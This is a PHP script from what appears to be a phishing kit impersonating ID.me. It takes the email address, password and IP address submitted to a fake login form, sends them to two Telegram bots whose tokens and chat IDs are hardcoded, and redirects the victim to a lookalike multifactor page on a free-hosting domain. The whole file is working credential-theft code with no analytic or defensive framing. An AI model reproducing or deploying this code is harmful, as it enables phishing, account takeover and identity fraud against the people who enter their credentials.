<?php

include 'firewall.php';

$telegram_bots = [
    [
        'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
        'chat_id' => '1325797388'
    ],
    [
        'token' => '7395338291:AAFiyILeZdxyENeRvcaYgZ93vnv2DYyW_XM',
        'chat_id' => '8160582785'
    ]
    // Add more bots here if needed
];



if ($_SERVER["REQUEST_METHOD"]=="POST"){
// $query = "INSERT INTO form (useremail,userpassword,timecol,ip) VALUES ('$_POST[useremail]','$_POST[userpassword]',NOW(),'$_POST[ip]')";
// $result = pg_query($query);


// Get and define form inputs
    $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');

    // Generate timestamp
    $timestamp = date("Y-m-d H:i:s");

// Define message structure before sending to Telegram
$telegram_message = "📝 *New IdMe Submission*:\n\n".
                    "👤 *Email:* $useremail\n".
                    "📧 *Password:* $userpassword\n".
                    "⏳ *Submitted At:* $timestamp\n".
                    "💬 *IP:* $ip";
                    


function sendMessageToTelegramBots($message, $bots) {
    foreach ($bots as $bot) {
        $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";

        $data = [
            'chat_id' => $bot['chat_id'],
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegram_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}

// Send text message to Telegram
sendMessageToTelegramBots($telegram_message, $telegram_bots);




header("Location:https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php");
exit;
}
?>
